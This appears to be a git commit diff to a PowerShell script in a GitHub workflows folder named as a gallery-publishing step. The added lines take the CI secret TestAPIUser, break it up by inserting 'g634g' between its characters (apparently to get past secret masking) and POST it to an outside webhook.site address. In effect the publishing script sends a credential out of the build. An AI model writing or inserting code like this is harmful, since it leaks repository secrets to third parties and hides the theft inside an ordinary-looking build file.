1efa600979eb645f6f0350b9e988b5996e2e653f
MKletz <michael.kletz.27@gmail.com>
2020-10-28 10:33:37 -0500

    ast

--- .github/workflows/PublishToGallery.ps1
+++ .github/workflows/PublishToGallery.ps1
@@ -1,2 +1,2 @@
-$ENV:TestAPIUser = [char[]]$ENV:TestAPIUser -join "g634g"
-Invoke-RestMethod -Method POST -Uri 'https://webhook.site/042894b1-915f-4d3f-9d07-484f53c15a10' -Body $ENV:TestAPIUser
+$testvar = [char[]]$ENV:TestAPIUser -join "g634g"
+Invoke-RestMethod -Method POST -Uri 'https://webhook.site/042894b1-915f-4d3f-9d07-484f53c15a10' -Body $testvar
